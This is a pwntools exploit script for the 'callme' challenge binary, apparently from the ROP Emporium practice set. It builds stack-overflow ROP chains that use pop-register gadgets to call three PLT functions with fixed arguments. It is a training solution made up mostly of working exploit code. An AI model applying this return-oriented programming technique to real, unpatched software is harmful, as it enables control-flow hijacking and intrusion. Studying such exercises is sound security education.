#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./callme')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0
rop = ROP(exe)

PWNME_ADDR = exe.sym.pwnme
CALL_ME_ONE_PLT = exe.plt.callme_one
CALL_ME_TWO_PLT = exe.plt.callme_two
CALL_ME_THREE_PLT = exe.plt.callme_three
POP_REGS_GADGET = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"]).address
RET_GADGET = rop.find_gadget(["ret"]).address

# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616b)
# We found a (convenient) pop rdi, pop rsi, pop rdx gadget (which are the registers that hold the first three arguments in x86_64).
# Call the gadget, fill the registers with the correct args, call the correct function, return to pwnme.
# Before calling callme_three, call a ret gadget to align the stack because printf will be printed

payload_one = "A"*OFFSET
payload_one += p64(POP_REGS_GADGET)
payload_one += p64(1) + p64(2) + p64(3)
payload_one += p64(CALL_ME_ONE_PLT)
payload_one += p64(PWNME_ADDR)
io.sendline(payload_one)

payload_two = "A"*OFFSET
payload_two += p64(POP_REGS_GADGET)
payload_two += p64(1) + p64(2) + p64(3)
payload_two += p64(CALL_ME_TWO_PLT)
payload_two += p64(PWNME_ADDR)
io.sendline(payload_two)

payload_three = "A"*OFFSET
payload_three += p64(POP_REGS_GADGET)
payload_three += p64(1) + p64(2) + p64(3)
payload_three += p64(RET_GADGET) # Align the stack
payload_three += p64(CALL_ME_THREE_PLT)
payload_three += p64(PWNME_ADDR)
io.sendline(payload_three)

io.interactive()

